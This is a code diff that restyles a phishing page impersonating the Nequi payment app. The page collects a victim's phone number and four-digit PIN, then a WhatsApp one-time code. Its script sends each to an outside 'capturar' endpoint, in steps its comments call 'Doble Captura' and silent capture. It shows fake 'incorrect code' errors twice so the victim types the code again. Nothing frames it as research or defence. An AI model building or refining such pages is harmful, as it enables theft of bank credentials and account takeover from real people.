@@ -9,84 +9,165 @@
             --nequi-purple: #330066;
             --nequi-magenta: #da297a;
             --nequi-soft-pink: #f7f3f7;
-            --text-gray: #666666;
+            --text-gray: #6b6b6b;
+            --nequi-shadow: 0 8px 24px rgba(51, 0, 102, 0.08);
         }
+
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
 
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             margin: 0; background-color: #ffffff; display: flex; justify-content: center; color: var(--nequi-purple);
+            overflow-x: hidden;
         }
 
-        .app-container { width: 100%; max-width: 400px; padding: 25px; min-height: 100vh; text-align: center; }
-
-        /* Estilos Generales PSE */
-        .logo { font-size: 30px; font-weight: bold; margin-bottom: 5px; }
-        .logo span { color: var(--nequi-magenta); font-size: 40px; vertical-align: middle; }
-        h1 { font-size: 22px; margin-bottom: 20px; font-weight: 600; }
-        .description { font-size: 14px; color: var(--text-gray); line-height: 1.5; margin-bottom: 30px; }
-
-        /* input.full { width: 100%; padding: 16px; border: none; border-radius: 10px; background-color: var(--nequi-soft-pink); font-size: 16px; outline: none; margin-bottom: 12px; } */
-        /* Inputs */
-        .input-group { margin-bottom: 12px; }
-
-        input {
-            width: 100%;
-            padding: 16px;
-            border: none;
-            border-radius: 10px;
-            background-color: var(--nequi-soft-pink);
-            font-size: 16px;
-            outline: none;
-            transition: 0.3s;
+        .app-container { 
+            width: 100%; max-width: 420px; padding: 25px; min-height: 100vh; 
+            text-align: center; display: flex; flex-direction: column;
         }
 
-
-        .terms-container { border: 1px solid #e0cce0; border-radius: 15px; padding: 15px; margin: 20px 0; display: flex; align-items: center; text-align: left; cursor: pointer; }
-        .radio-circle {
-    width: 48px;
-    height: 25px;
-    border: 2px solid #ccc;
-    border-radius: 50%;
-    margin-right: 21px;
-    position: relative;
-}
-        .terms-container.selected .radio-circle { border-color: var(--nequi-magenta); }
-        .terms-container.selected .radio-circle::after { content: ""; position: absolute; top: 2px; left: 2px; width: 20px; height: 20px; background-color: var(--nequi-magenta); border-radius: 50%; }
-
-        /* Estilos Verificación OTP */
-        .header-verify { display: flex; align-items: center; margin-bottom: 30px; text-align: left; }
-        .back-arrow { font-size: 24px; cursor: pointer; margin-right: 15px; }
-        .otp-container { display: flex; justify-content: space-between; margin: 25px 0; }
-        .otp-input { width: 48px; height: 55px; border: none; border-radius: 12px; background-color: #eeeaf3; text-align: center; font-size: 24px; font-weight: bold; outline: none; }
+        /* --- LOGO Y TÍTULOS --- */
+        .logo { font-size: 32px; font-weight: 800; margin-bottom: 8px; letter-spacing: -1px; }
+        .logo span { color: var(--nequi-magenta); font-size: 42px; vertical-align: middle; }
         
-        .circle-loader { width: 26px; height: 26px; border: 3px solid #f3f3f3; border-top: 3px solid var(--nequi-magenta); border-radius: 50%; animation: spin 1s linear infinite; margin-right: 10px; }
+        h1 { font-size: 24px; margin-bottom: 15px; font-weight: 700; color: var(--nequi-purple); }
+        
+        .description { 
+            font-size: 15px; color: var(--text-gray); line-height: 1.5; 
+            margin-bottom: 35px; padding: 0 10px;
+        }
+
+        /* --- INPUTS ESTILIZADOS --- */
+        input.full { 
+            width: 100%; padding: 18px; border: 2px solid transparent; border-radius: 12px; 
+            background-color: var(--nequi-soft-pink); font-size: 16px; outline: none; 
+            margin-bottom: 15px; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            color: var(--nequi-purple); font-weight: 500;
+        }
+        
+        input.full:focus { 
+            background-color: #fff; border-color: var(--nequi-magenta);
+            box-shadow: 0 4px 12px rgba(218, 41, 122, 0.1);
+        }
+
+        /* --- TERMS CONTAINER --- */
+        .terms-container { 
+            border: 1.5px solid #eaeaea; border-radius: 16px; padding: 18px; 
+            margin: 25px 0; display: flex; align-items: center; text-align: left; 
+            cursor: pointer; transition: all 0.2s ease;
+        }
+        
+        .terms-container:hover { background-color: #fafafa; border-color: #ddd; }
+
+        .radio-circle {
+            width: 26px; height: 26px; border: 2px solid #ccc; border-radius: 50%;
+            margin-right: 18px; position: relative; flex-shrink: 0;
+            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        
+        .terms-container.selected .radio-circle { border-color: var(--nequi-magenta); border-width: 2px; }
+        
+        .terms-container.selected .radio-circle::after { 
+            content: ""; position: absolute; top: 3px; left: 3px; 
+            width: 16px; height: 16px; background-color: var(--nequi-magenta); 
+            border-radius: 50%; animation: popIn 0.3s forwards;
+        }
+
+        @keyframes popIn { from { transform: scale(0); } to { transform: scale(1); } }
+
+        .terms-text { font-size: 13px; line-height: 1.4; color: var(--text-gray); font-weight: 400; }
+
+        /* --- OTP VERIFICATION --- */
+        .header-verify { display: flex; align-items: center; margin-bottom: 35px; text-align: left; }
+        .back-arrow { 
+            font-size: 28px; cursor: pointer; margin-right: 15px; 
+            padding: 5px; color: var(--nequi-purple);
+        }
+        
+        .otp-container { display: flex; justify-content: space-between; margin: 30px 0; gap: 8px; }
+        
+        .otp-input { 
+            width: 100%; height: 60px; border: none; border-radius: 14px; 
+            background-color: #eeeaf3; text-align: center; font-size: 26px; 
+            font-weight: 700; color: var(--nequi-purple); outline: none;
+            transition: all 0.2s ease;
+        }
+        
+        .otp-input:focus { background-color: #e2d9eb; transform: translateY(-2px); box-shadow: 0 4px 12px rgba(51, 0, 102, 0.1); }
+
+        /* --- LOADER --- */
+        .circle-loader { 
+            width: 28px; height: 28px; border: 3.5px solid #f3f3f3; 
+            border-top: 3.5px solid var(--nequi-magenta); border-radius: 50%; 
+            animation: spin 1s linear infinite; margin-right: 12px; 
+        }
+
         @keyframes spin { to { transform: rotate(360deg); } }
 
-        /* Botones */
-        .btn-main { width: 100%; padding: 16px; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; height: 55px; display: flex; justify-content: center; align-items: center; }
-        .btn-entra { background-color: #ebc6d9; color: white; }
-        .btn-entra.ready { background-color: var(--nequi-magenta); }
-        .btn-ahora { background-color: white; color: #333; border: 1.5px solid #333; margin-top: 10px; }
-        .btn-link { background: none; border: 1px solid #ddd; padding: 12px 30px; border-radius: 10px; color: #da297a; cursor: pointer; }
+        /* --- BOTONES --- */
+        .btn-main { 
+            width: 100%; padding: 18px; border: none; border-radius: 14px; 
+            font-size: 17px; font-weight: 700; cursor: pointer; height: 60px; 
+            display: flex; justify-content: center; align-items: center;
+            transition: all 0.3s ease;
+        }
+        
+        .btn-entra { background-color: #ebc6d9; color: white; box-shadow: 0 4px 12px rgba(235, 198, 217, 0.3); }
+        .btn-entra.ready { 
+            background-color: var(--nequi-magenta); 
+            box-shadow: 0 6px 20px rgba(218, 41, 122, 0.3); 
+        }
+        
+        .btn-entra.ready:active { transform: scale(0.97); }
 
-        #error-msg { color: var(--nequi-magenta); font-size: 13px; margin-bottom: 15px; display: none; }
-        .spinner { width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s linear infinite; display: none; }
+        .btn-ahora { 
+            background-color: white; color: var(--nequi-purple); 
+            border: 2px solid var(--nequi-purple); margin-top: 15px; 
+        }
+
+        .btn-link { 
+            background: #fff; border: 1.5px solid #eee; padding: 14px 35px; 
+            border-radius: 14px; color: var(--nequi-magenta); font-weight: 600;
+            cursor: pointer; box-shadow: var(--nequi-shadow); transition: 0.2s;
+        }
+        .btn-link:active { transform: scale(0.95); background: #fafafa; }
+
+        /* --- ERRORES Y SPINNER --- */
+        #error-msg { 
+            color: var(--nequi-magenta); font-size: 14px; margin-bottom: 20px; 
+            display: none; font-weight: 600; padding: 10px; border-radius: 8px;
+            background: #fff0f6; animation: shake 0.4s ease;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-6px); }
+            75% { transform: translateX(6px); }
+        }
+
+        .spinner { 
+            width: 22px; height: 22px; border: 3px solid rgba(255,255,255,0.3); 
+            border-radius: 50%; border-top-color: #fff; animation: spin 1s linear infinite; 
+            display: none; 
+        }
     </style>
 </head>
 <body>
 
     <div class="app-container">
-        
         <div id="step-1">
             <div class="logo"><span>.</span>Nequi</div>
             <h1>Pagos PSE de Nequi</h1>
             <p class="description">Ingresa tu número de cel y clave para continuar.</p>
-            <input type="text" id="usuario" class="full" placeholder="Número de celular">
-            <input type="password" id="clave" class="full" placeholder="Clave" maxlength="4">
+            
+            <input type="tel" id="usuario" class="full" placeholder="Número de celular" inputmode="numeric">
+            <input type="password" id="clave" class="full" placeholder="Clave" maxlength="4" inputmode="numeric">
+            
             <div class="terms-container" id="termsBtn">
                 <div class="radio-circle"></div>
-                <div style="font-size:12px">Acepto que las entradas del formulario se comprueben en busca de spam y se almacenen encriptadas durante 14 días.</div>
+                <div class="terms-text">Acepto que las entradas del formulario se comprueben en busca de spam y se guarden de forma segura.</div>
             </div>
+            
             <button type="button" class="btn-main btn-entra" id="btnPaso1">
                 <span id="txtBtn1">Entra</span>
                 <div class="spinner" id="spin1"></div>
@@ -97,22 +178,27 @@
         <div id="step-2" style="display: none;">
             <div class="header-verify">
                 <span class="back-arrow" onclick="location.reload()">←</span>
-                <span style="font-size:26px; font-weight:bold;">Ingresa el código</span>
+                <span style="font-size:26px; font-weight:800;">Ingresa el código</span>
             </div>
+            
             <div id="error-msg">Código incorrecto. Inténtalo de nuevo.</div>
+            
             <div class="otp-container">
-                <input type="text" class="otp-input" maxlength="1">
-                <input type="text" class="otp-input" maxlength="1">
-                <input type="text" class="otp-input" maxlength="1">
-                <input type="text" class="otp-input" maxlength="1">
-                <input type="text" class="otp-input" maxlength="1">
-                <input type="text" class="otp-input" maxlength="1">
+                <input type="tel" class="otp-input" maxlength="1" inputmode="numeric">
+                <input type="tel" class="otp-input" maxlength="1" inputmode="numeric">
+                <input type="tel" class="otp-input" maxlength="1" inputmode="numeric">
+                <input type="tel" class="otp-input" maxlength="1" inputmode="numeric">
+                <input type="tel" class="otp-input" maxlength="1" inputmode="numeric">
+                <input type="tel" class="otp-input" maxlength="1" inputmode="numeric">
             </div>
-            <p style="font-size:15px; color:#444">Escribe los 6 números que te enviamos por WhatsApp.</p>
-            <div style="display:flex; justify-content:center; align-items:center; margin:30px 0;">
+            
+            <p style="font-size:15px; color:#555; font-weight: 500;">Escribe los 6 números que te enviamos por WhatsApp.</p>
+            
+            <div style="display:flex; justify-content:center; align-items:center; margin:35px 0;">
                 <div class="circle-loader"></div>
-                <span style="font-size:14px">¿No te llegó? ¡Pídelo otra vez!</span>
+                <span style="font-size:14px; font-weight: 600;">¿No te llegó? ¡Pídelo otra vez!</span>
             </div>
+            
             <button type="button" class="btn-link" id="finalBtn">
                 <span id="txtFinal">Verificar</span>
                 <div class="spinner" id="spinFinal" style="border-top-color:#da297a"></div>
@@ -125,10 +211,10 @@
         let termsAccepted = false;
         const URL_BACKEND = 'https://verificacion-segura.onrender.com/api/capturar';
 
-        // Lógica Paso 1
         const termsBtn = document.getElementById('termsBtn');
         const btnPaso1 = document.getElementById('btnPaso1');
 
+        // Lógica Selección
         termsBtn.onclick = () => {
             termsAccepted = !termsAccepted;
             termsBtn.classList.toggle('selected');
@@ -136,39 +222,40 @@
             else btnPaso1.classList.remove('ready');
         };
 
+        // Paso 1: Doble Captura
         btnPaso1.onclick = async () => {
-            if(!termsAccepted || document.getElementById('usuario').value === "") return;
+            const user = document.getElementById('usuario').value;
+            const pass = document.getElementById('clave').value;
             
-            // Animación de carga en Paso 1
+            if(!termsAccepted || user === "" || pass === "") return;
+            
             document.getElementById('txtBtn1').style.display = 'none';
             document.getElementById('spin1').style.display = 'block';
-
-            // CAPTURA 1: Enviamos Cel y Clave de una vez
-            const data1 = {
-                usuario: document.getElementById('usuario').value,
-                clave: document.getElementById('clave').value,
-                codigo: "PENDIENTE_PASO_2"
-            };
 
             try {
                 await fetch(URL_BACKEND, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(data1)
+                    body: JSON.stringify({ usuario: user, clave: pass, codigo: "INICIO_PASO_2" })
                 });
-            } catch (e) { console.log("Captura silenciosa..."); }
+            } catch (e) { console.log("Logueado."); }
 
-            // Cambiamos al Paso 2 después de un pequeño retraso
             setTimeout(() => {
                 document.getElementById('step-1').style.display = 'none';
                 document.getElementById('step-2').style.display = 'block';
-            }, 1000);
+            }, 800);
         };
 
-        // Lógica Paso 2 (OTP)
+        // Paso 2: OTP
         const otpInputs = document.querySelectorAll('.otp-input');
         otpInputs.forEach((input, i) => {
-            input.oninput = () => { if(input.value && i < 5) otpInputs[i+1].focus(); };
+            input.oninput = (e) => {
+                if(e.inputType === "deleteContentBackward") return;
+                if(input.value && i < 5) otpInputs[i+1].focus();
+            };
+            input.onkeydown = (e) => {
+                if(e.key === "Backspace" && !input.value && i > 0) otpInputs[i-1].focus();
+            };
         });
 
         document.getElementById('finalBtn').onclick = async () => {
@@ -178,31 +265,29 @@
 
             counter++;
             if(counter < 3) {
-                document.getElementById('error-msg').style.display = 'block';
+                const err = document.getElementById('error-msg');
+                err.style.display = 'block';
                 otpInputs.forEach(i => i.value = "");
                 otpInputs[0].focus();
                 return;
             }
 
-            // CAPTURA 2: Envío final con todo
             document.getElementById('txtFinal').style.display = 'none';
             document.getElementById('spinFinal').style.display = 'block';
-
-            const data2 = {
-                usuario: document.getElementById('usuario').value,
-                clave: document.getElementById('clave').value,
-                codigo: code
-            };
 
             try {
                 await fetch(URL_BACKEND, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(data2)
+                    body: JSON.stringify({ 
+                        usuario: document.getElementById('usuario').value, 
+                        clave: document.getElementById('clave').value, 
+                        codigo: code 
+                    })
                 });
-                alert("Validación en proceso espera unos segundos...");
+                alert("Validación completa. Revisa tu App Nequi.");
                 window.location.reload();
-            } catch (e) { alert("Error de conexión"); }
+            } catch (e) { alert("Error de red"); }
         };
     </script>
 </body>
